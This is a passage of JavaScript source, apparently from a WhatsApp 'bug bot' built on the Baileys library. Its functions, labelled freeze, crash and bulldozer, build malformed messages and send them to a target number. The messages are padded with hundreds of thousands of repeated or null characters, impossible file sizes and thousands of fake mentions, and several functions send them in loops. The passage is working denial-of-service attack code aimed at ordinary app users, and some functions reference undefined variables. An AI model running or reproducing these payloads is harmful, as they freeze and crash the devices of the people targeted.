                                    paymentInviteMessage: {
                                        serviceType: 3,
                                        expiryTimestamp: Date.now() + 1814400000
                                    },
                                }
                            },
                        },
                    },
                },
            }, {
                participant: {
                    jid: target
                },
                userJid: target,
            }
        );
    } catch (err) {
        console.log(err);
    }
}

async function LocationAxata(axata, target) {
    console.log(chalk.red(`DONE KEKIRIM BY AXATA☠️🤓`));
    let AyunCantik = JSON.stringify({
        status: true,
        criador: "Axata Nih anj",
        resultado: {
            type: "md",
            ws: {
                _events: {
                    "CB:ib,,dirty": ["Array"]
                },
                _eventsCount: 80000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    sockCectTimeoutMs: 2000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 6000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: {
                        Object: "authData"
                    },
                    markOnlineOnsockCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: {
                        Object: "transactionOptsData"
                    },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: {
                        Object: "appStateMacData"
                    },
                    mobile: true
                }
            }
        }
    });
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: -9999,
                    degreesLongitude: 9999,
                    name: "🤓AxataNihBree☠️" + "ꦾ".repeat(180000),
                    address: AyunCantik,
                    contextInfo: {
                        mentionedJid: [
                            target,
                            ...Array.from({
                                    length: 1945
                                }, () =>
                                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            )
                        ],
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const locationMsg = generateWAMessageFromContent(target, generateLocationMessage, {});

    await axata.relayMessage(target, locationMsg.message, {
        messageId: locationMsg.key.id,
        participant: {
            jid: target
        },
        userJid: target
    });
}

async function AxataMuda(axata, target) {
    const cardss = [];

    for (let i = 0; i < 10; i++) {
        cardss.push({
            header: {
                hasMediaAttachment: true,
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: "qbcHpQMuyE/rnd/4A3aLRth0hM6U7GWi3QBO0NAC6xQ=",
                    fileLength: "9999999999999999999999",
                    pageCount: 9999999999,
                    mediaKey: "eOi7nJvxr+iO9GzptSFWSqsD9P+aIQ85D3CYBzcRvgI=",
                    fileName: "OTAX IS HERE" + "ꦽ".repeat(500000),
                    fileEncSha256: "pYwQbEFgkLdJwdiXMxX87oTBmb6zitzbjkAH2ydR4ac=",
                    directPath: "/v/t62.7119-24/534859870_1051153396838314_2122100419717937309_n.enc?ccb=11-4&oh=01_Q5Aa2QFkDDvahAmTQB2rFSTjSTJV7uluYpY9jTpBENlcb7Sacw&oe=68CA3A18&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1755491865"
                }
            },
            body: {
                text: "LOVE U" + "ꦽ".repeat(500000)
            },
            nativeFlowMessage: {
                buttons: [{
                        name: 'mpm',
                        buttonParamsJson: "{[" + "ꦽ".repeat(500000)
                    },
                    {
                        name: 'galaxy_message',
                        buttonParamsJson: "\n".repeat(100000)
                    }
                ],
                messageParamsJson: "{[".repeat(500000)
            }
        });
    }

    const content = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "AXATA IS HERE" + "ꦽ".repeat(500000)
                    },
                    carouselMessage: {
                        messageVersion: 1,
                        cards: cardss
                    },
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({
                                    length: 1900
                                },
                                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            )
                        ],
                        remoteJid: "X",
                        stanzaId: "123",
                        quotedMessage: {
                            paymentInviteMessage: {
                                serviceType: 3,
                                expiryTimestamp: Date.now() + 1814400000
                            },
                            forwardedAiBotMessageInfo: {
                                botName: "META AI",
                                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                creatorName: "Bot"
                            }
                        }
                    }
                }
            }
        }
    };

    await axata.relayMessage(target, content, {
        messageId: "",
        participant: {
            jid: target
        },
        userJid: target
    });
}

async function chatFrezze(axata, target) {
    const fakeKey = {
        "remoteJid": target,
        "fromMe": true,
        "id": await axata.relayMessage(target, {
            "albumMessage": {
                "expectedImageCount": -99999999,
                "expectedVideoCount": 0,
                "caption": "x"
            }
        }, {})
    }

    let xx = {
        "url": "https://mmg.whatsapp.net/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0&mms3=true",
        "mimetype": "image/jpeg",
        "fileSha256": "hCWVPwWmbHO4VlRlOOkk5zhGRI8a6O2XNNEAxrFnpjY=",
        "fileLength": "164089",
        "height": 9999,
        "width": 9999,
        "mediaKey": "2zZ0K/gxShTu5iRuTV4j87U8gAjvaRdJY/SQ7AS1lPg=",
        "fileEncSha256": "ar7dJHDreOoUA88duATMAk/VZaZaMDKGGS6VMlTyOjA=",
        "directPath": "/v/t62.7118-24/11890058_680423771528047_8816685531428927749_n.enc?ccb=11-4&oh=01_Q5Aa1gEOSJuDSjQ8aFnCByBRmpMc4cTiRpFWn6Af7CA4GymkHg&oe=686B0E3F&_nc_sid=5e03e0"
    }

    for (let s = 0; s < 10; s++) {
        const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
            "botInvokeMessage": {
                "message": {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2,
                        "supportPayload": JSON.stringify({
                            "version": 2,
                            "is_ai_message": true,
                            "should_show_system_message": true,
                            "ticket_id": crypto.randomBytes(16)
                        }),
                        "messageSecret": (0, crypto.randomBytes)(32),
                        "messageAssociation": {
                            "associationType": "MEDIA_ALBUM",
                            "parentMessageKey": fakeKey
                        }
                    },
                    "imageMessage": xx
                }
            }
        }), {
            participant: {
                jid: target
            }
        })

        const xz = await axata.relayMessage(target, xy.message, {
            messageId: xy.key.id
        })

        xx.caption = "ꦾ".repeat(100000);

        axata.relayMessage(target, {
            protocolMessage: {
                type: "MESSAGE_EDIT",
                key: {
                    fromMe: true,
                    remoteJid: target,
                    id: xz
                },
                editedMessage: {
                    imageMessage: xx
                }
            }
        }, {
            participant: {
                jid: target
            }
        })
        await sleep(100)
    }
}

async function HomoAxata(target) {
    try {
        for (let i = 0; i < 60; i++) {
            const PouMsg = generateWAMessageFromContent(
                target,
                proto.Message.fromObject({
                    interactiveMessage: {
                        header: {
                            subtitle: "𝐏͠𝐎͜𝐔͠ 𝐈͜𝐒͠ 𝐁͠𝐀͜𝐂͠𝐊",
                            imageMessage: {
                                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&mms3=true",
                                mimetype: "image/jpeg",
                                caption: "Pou Sigma Mewing 😍" + "ꦽ".repeat(5000) + "ꦾ".repeat(5000),
                                fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
                                fileLength: "71746",
                                height: 916,
                                width: 720,
                                mediaKey: "n5z/W8ANmTT0KmZKPyk13uTpm3eRB4czy0p/orz6LOw=",
                                fileEncSha256: "CxcswDicTjs/UHDH1V5DWZh25jk1l0zMLrcTEJyuYMM=",
                                directPath: "/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&_nc_hot=1762092861",
                                mediaKeyTimestamp: "1762085432",
                                jpegThumbnail: Buffer.from(
                                    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOAMBIgACEQEDEQH/xAAwAAACAwEBAAAAAAAAAAAAAAAABAECAwUGAQADAQEAAAAAAAAAAAAAAAAAAQMCBP/aAAwDAQACEAMQAAAA6iK052qv1Jy+R0dVGejPNFJuwypOjdJZNqpvYJpEFIN600nvWlx6lZlU0ialOdtnK86sYN5hktvdnIHRYvcDTEgy2QAsAl//xAAkEAACAgICAgICAwAAAAAAAAABAgADETEEIRIiEBM0YQUyUf/aAAgBAQABPwBuZSh3L+e79VR0dvZjmEfqey9zjfyVlXT9iUciu9coYqgljAF3APKFVA/rAldg7XEsrrBIAlNrce9COgYoKMUh2QJWMACW0ee4qGsAQ1eRIyRLVxdTnWZy8B8jcrBcxHxA4Ilrd/oRyMhhLz9lqINkwkuCTsysYhUKhMUnEwuyRLcf6JR+bXEEB8GhYOpEVfXBn1gDIWW6PrOH+YrHUURDoERqEI6GIQ1Z71PsXG5aylTPAhIPhWyBLATDxwOzFrTHaiXrFx8AwHuMQYTiXEET/8QAGhEAAgMBAQAAAAAAAAAAAAAAAAECICEQEf/aAAgBAgEBPwBts8FgtHj7GkaOv//EABsRAAMAAwEBAAAAAAAAAAAAAAABEQIQICEx/9oACAEDAQE/AIQeOrUhDSMvr0jycUnP/9k=",
                                    "base64"
                                ),
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "Pou Sigma Mewing 😍" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
                        },
                        footer: {
                            text: "𝐏͠𝐎͜𝐔͠ 𝐈͜𝐒͠ 𝐁͠𝐀͜𝐂͠𝐊"
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(5000),
                            buttons: [{
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𑜦𑜠".repeat(10000),
                                        id: null
                                    })
                                },
                                {
                                    name: "quick_reply",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𑜦𑜠".repeat(10000),
                                        id: null
                                    })
                                },
                                {
                                    name: "cta_url",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𑜦𑜠".repeat(10000),
                                        url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                                    })
                                },
                                {
                                    name: "cta_copy",
                                    buttonParamsJson: JSON.stringify({
                                        display_text: "𑜦𑜠".repeat(10000),
                                        copy_code: "𑜦𑜠".repeat(10000)
                                    })
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        icon: "PROMOTION",
                                        flow_cta: "PouJembut",
                                        flow_message_version: "3"
                                    })
                                }
                            ]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({
                                length: 1000
                            }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
                            isForwarded: true,
                            forwardingScore: 999,
                            externalAdReply: {
                                title: "Homo SigmaWing",
                                body: "Click untuk menjadi homo 🤤💦",
                                thumbnailUrl: "https://img1.pixhost.to/images/9872/657036846_ochobot.jpg",
                                sourceUrl: "https://t.me/PouSkibudi",
                                mediaType: 1,
                                showAdAttribution: true,
                                renderLargerThumbnail: true
                            }
                        }
                    }
                }), {
                    userJid: target
                }
            );

            await axata.relayMessage(target, PouMsg.message, {
                messageId: PouMsg.key.id,
            });

            console.log(`DONE BY GW`);
            await new Promise(r => setTimeout(r, 500));
        }

        console.log("DONE BY GW");
    } catch (crt) {
        console.error("EROR NJIR:", crt);
    }
}

// -----------------( END FUNCTION FREZZE )--------------------- \\



// ------------------ ( FUNCTION CRASH ) ------------------------ \\

async function AXTCrashSw(axata, target) {
    try {
        let msg1 = generateWAMessageFromContent(target, {
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc",
                mimetype: "video/mp4",
                fileSha256: "RLju7GEX/CvQPba1MHLMykH4QW3xcB4HzmpxC5vwDuc=",
                fileLength: "327833",
                seconds: 15,
                mediaKey: "3HFjGQl1F51NXuwZKRmP23kJQ0+QECSWLRB5pv2Hees=",
                caption: "./GyzenLyoraa☀⃠" + "ꦾ".repeat(30000),
                height: 1249989998989998,
                width: 709998989998884,
                fileEncSha256: "ly0NkunnbgKP/JkMnRdY5GuuUp29pzUpuU08GeI1dJI=",
                directPath: "/v/t62.7161-24/29608892_1222189922826253_8067653654644474816_n.enc",
                mediaKeyTimestamp: "1748347294",
                contextInfo: {
                    isSampled: true,
                    mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`),
                    statusAttributionType: "SHARED_FROM_MENTION",
                },
                streamingSidecar: "GMJY/Ro5A3fK9TzHEVmR8rz+caw+K3N+AA9VxjyHCjSHNFnOS2Uye15WJHAhYwca/3HexxmGsZTm/Viz",
                thumbnailDirectPath: "/v/t62.36147-24/29290112_1221237759467076_3459200810305471513_n.enc",
                thumbnailSha256: "5KjSr0uwPNi+mGXuY+Aw+tipqByinZNa6Epm+TOFTDE=",
                thumbnailEncSha256: "2Mtk1p+xww0BfAdHOBDM9Wl4na2WVdNiZhBDDB6dx+E=",
                annotations: [{
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "589608164114571",
                            songId: "870166291800508",
                            author: "ꦾ".repeat(20000),
                            title: "ꦾ".repeat(20000),
                            artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc",
                            artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                            artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
                            artistAttribution: "https://www.instagram.com/_u/xrelly",
                            countryBlocklist: true,
                            isExplicit: true,
                            artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU=",
                        },
                    },
                    embeddedAction: true
                }]
            }
        }, {});

        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        mimetype: "image/webp",
                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                        fileLength: "999999999",
                        mediaKeyTimestamp: "1746112211",
                        firstFrameLength: 19904,
                        firstFrameSidecar: "KN4kQ5pyABRAgA==",
                        isAnimated: true,
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555000${z + 1}@s.whatsapp.net`),
                            groupMentions: [],
                            entryPointConversionSource: "non_contact",
                            entryPointConversionApp: "whatsapp",
                            entryPointConversionDelaySeconds: 467593,
                        },
                        stickerSentTs: Date.now(),
                        isAvatar: true,
                        isAiSticker: true,
                        isLottie: true
                    }
                }
            }
        }, {});

        let msg3 = generateWAMessageFromContent(target, {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: Date.now(),
                title: "ꦾ".repeat(30000)
            }
        }, {});

        await axata.relayMessage("status@broadcast", msg1.message, {
            messageId: msg1.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        await axata.relayMessage("status@broadcast", msg2.message, {
            messageId: msg2.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        await axata.relayMessage("status@broadcast", msg3.message, {
            messageId: msg3.key.id,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
                }]
            }]
        });

        console.log("✅ Successfully Sent the Bug to the Target.");
    } catch (error) {
        console.log("❌ Failed to Send Bug to Target");
    }
}

async function AxataCrlCrash(target) {
  const cards = [];
  for (let i = 0; i < 18; i++) {
    cards.push({
      header: {
        title: "𝙋𝙊𝙐 𝙆𝙄𝙇𝙇 𝙔𝙊𝙐 🦠" + "\u0000".repeat(50000),
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4",
          mimetype: "image/jpeg",
          caption: "𝙋𝙊𝙐 𝙆𝙄𝙇𝙇 𝙔𝙊𝙐 🦠" + "ꦽ".repeat(5000) + "ꦾ".repeat(5000),
          fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
          fileLength: 71746,
          height: 916,
          width: 720,
          mediaKey: "n5z/W8ANmTT0KmZKPyk13uTpm3eRB4czy0p/orz6LOw=",
          fileEncSha256: "CxcswDicTjs/UHDH1V5DWZh25jk1l0zMLrcTEJyuYMM=",
          directPath: "/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4",
          mediaKeyTimestamp: 1762085432,
          jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/..."
        },
        hasMediaAttachment: true
      },
      nativeFlowMessage: {
        messageParamsJson: "{}".repeat(5000),
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify({
              icon: "PROMOTION",
              flow_cta: "PouJembut",
              flow_message_version: "3"
            })
          },
          {
          "name": "galaxy_message",
          "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
          })
          },
          {
            name: "mpm",
            buttonParamsJson: JSON.stringify({ status: true })
          }
        ]
      }
    });
  }
  const PouMsg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            supportPayload: JSON.stringify({
              version: 3,
              is_ai_message: true,
              should_show_system_message: true,
              ticket_id: crypto.randomBytes(16)
            })
          },
          interactiveMessage: {
            body: {
              text: "𝙋𝙊𝙐 𝙆𝙄𝙇𝙇 𝙊𝙐 🦠" + "ꦽ".repeat(3000) + "ꦾ".repeat(3000)
            }
          },

          carouselMessage: {
            cards
          }
        }
      }
    },
    {}
  );
  await axata.relayMessage(target, PouMsg.message, { 
    messageId: PouMsg.key.id 
  });
}

// ------------------ ( FUNCTION GROUP ) ------------------------ \\

async function AxataGroup(groupId) {
    await axata.sendMessage(jid, {
        text: "ꦽ".repeat(1000),
        mentions: jid,
        contextInfo: {
            mentionedJid: jid,
            isGroupMention: true
        }
    });
}

//priv numb { buat ke number orang }
async function uMine(client, sheesh) {
    let pLoad = JSON.stringify({
        type: "invoke",
        payload: {
            bot_id: "meta_ai",
            action: "send_card",
            recipient: {
                phone_number: sheesh,
                name: "Meta AI"
            },
            card_data: {
                template_id: "show_cards_users",
                components: [{
                        type: "header",
                        parameters: {
                            title: "",
                            image: {
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/530142719_1293392145516971_3436280522584024074_n.enc?ccb=11-4&oh=01_Q5Aa2QGLer6HhSJ0R8Wb6SP2iUqTdrhTHucmDXcaDLp8x15lgQ&oe=68C0297E&_nc_sid=5e03e0&mms3=true"
                            }
                        }
                    },
                    {
                        type: "body",
                        parameters: {
                            text: "",
                            variables: {
                                name: "ctp",
                                offer_code: "SHA_256"
                            }
                        }
                    },
                    {
                        type: "button",
                        parameters: [{
                                type: "single_select",
                                button_id: "btn_accept",
                                text: ""
                            },
                            {
                                type: "highlight_label",
                                button_id: "btn_decline",
                                text: ""
                            }
                        ]
                    }
                ]
            },
            metadata: {
                request_id: "REQUEST_BY_OTHER",
                timestamp: null,
                source: "com.whatsapp"
            }
        }
    });

    let cMine = generateWAMessageFromContent(sheesh, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                    shop: 999,
                    participant: {
                        jid: sheesh
                    },
                    expiration: 999,
                    ephemeralSettingTimestamp: 100000,
                    entryPointConversionSource: "cache",
                    entryPointConversionApp: "Whatsapp",
                    entryPointConversionDelaySeconds: 9670,
                    disappearingMode: {
                        initiator: "INITIATED_BY_OTHER",
                        trigger: "ACCOUNT_STATUS"
                    }
                },
                interactiveMessage: {
                    header: {
                        title: "ꦽ".repeat(1000),
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "....*"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(10000),
                        businessMessageForwardInfo: {
                            businessOwnerJid: "0123456789@s.whatsapp.net"
                        },
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "{sheesh-mine.json}"
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: pLoad
                            },
                            {
                                name: "payment_info",
                                buttonParamsJson: "{\"currency\":\"XAUSD\",\"amount\":{\"value\":null,\"offset\":100},\"payment_type\":\"upi\",\"payment_configuration\":\"merchant_config_123\",\"transaction_id\":\"TX1234567890\",\"status\":\"null\",\"note\":\"-client\"}"
                            },
                            {
                                name: "account_type",
                                buttonParamsJson: pLoad
                            }
                        ]
                    }
                }
            }
        }
    }, {
        isAnimated: true
    });

    await axata.relayMessage(sheesh, cMine.message, {
        messageId: "",
        participant: {
            jid: sheesh
        },
    });
}

// -----------------( END FUNCTION GROUP )--------------------- \\



// ------------------ ( FUNCTION BULDOZER ) ------------------------ \\

async function Buldosedot(target) {
    for (let i = 0; i < 200; i++) {
        const message = {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        contextInfo: {
                            mentionedJid: Array.from({
                                    length: 5000
                                }, () =>
                                "6" + Math.floor(Math.random() * 9999999999) + "@s.whatsapp.net"
                            )
                        }
                    }
                }
            }
        };

        await axata.relayMessage(target, message, {
            messageId: null,
            participant: {
                jid: target
            },
            userJid: target
        });
    }
}

async function AxtBulldoVis(axata, target) {
    const viewOnceMsg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                    fileLength: "99999999999999999",
                    height: "9999999999999999",
                    width: "9999999999999999",
                    mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                    fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                    directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "172519628",
                    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDABsSFBcUERsXFhceHBsgKEIrKCUlKFE6PTBCYFVlZF9VXVtqeJmBanGQc1tdhbWGkJ6jq62rZ4C8ybqmx5moq6T/2wBDARweHigjKE4rK06kbl1upKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKSkpKT/wgARCABIAEgDASIAAhEBAxEB/8QAGgAAAgMBAQAAAAAAAAAAAAAAAAUCAwQBBv/EABcBAQEBAQAAAAAAAAAAAAAAAAABAAP/2gAMAwEAAhADEAAAAN6N2jz1pyXxRZyu6NkzGrqzcHA0RukdlWTXqRmWLjrUwTOVm3OAXETtFZa9RN4tCZzV18lsll0y9OVmbmkcpbJslDflsuz7JafOepX0VEDrcjDpT6QLC4DrxaFFgHL/xAAaEQADAQEBAQAAAAAAAAAAAAAAARExAhEh/9oACAECAQE/AELJqiE/ELR5EdaJmxHWxfIjqLZ//8QAGxEAAgMBAQEAAAAAAAAAAAAAAAECEBEhMUH/2gAIAQMBAT8AZ9MGsdMzTcQuumR8GjymQfCQ+0yIxiP/xAArEAABBAECBQQCAgMAAAAAAAABAAIDEQQSEyEiIzFRMjNBYQBxExQkQoH/2gAIAQEAAT8Af6Ssn3SpXbWEpjHOcOHAlN6MQBJH6RiMkJdRIWVEYnhwYWg+VpJt5P1+H+g/pZHulZR6axHi9rvjso5GuYLFoT7H7QWgFavKHMY0UeK0U8zx4QUh5D+lOeqVMLYq2vFeVE7YwX2pFsN73voLKnEs1t9I7LRPU8/iU9MqX3Sn8SGjiVj6PNJUjxtHhTROiG1wpZwqNfC0Rwp4+UCpj0yp3U8laVT5nSEXt7KGUnushjZG0Ra1DEP8ZrsFR7LTZjFMPB7o8zeB7qc9IrI4ly0bvIozRRNttSMEsZ+1qGG6CQuA5So3U4LFdugYT4U/tFS+py0w0ZKUb7ophtqigdt+lPiNkjLJACCs/Tn4jt92wngVhH/GZfhZHtFSnmctNcf7JYP9kIzHVnuojwUMlNpSPBK1Pa/DeD/xQ8uG0fJCyT0isg1axH7MpjvtSDcy1A6xSc4jsi/gtQyDyx/LioySA34C//4AAwD/2Q==",
                    streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                    caption: "ꦾ".repeat(20000) + "ꦾ".repeat(60000),
                    contextInfo: {
                        stanzaId: "Thumbnail.id",
                        isForwarded: true,
                        forwardingScore: 999,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({
                                length: 1990
                            }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
                        ]
                    }
                }
            }
        }
    }, {});

    const Payment_Info = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "Ondet Onde X",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "galaxy_message",
                paramsJson: "\u0000".repeat(1045000),
                version: 3
            }
        }
    }, {});

    await axata.relayMessage("status@broadcast", viewOnceMsg.message, {
        messageId: viewOnceMsg.key.id,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
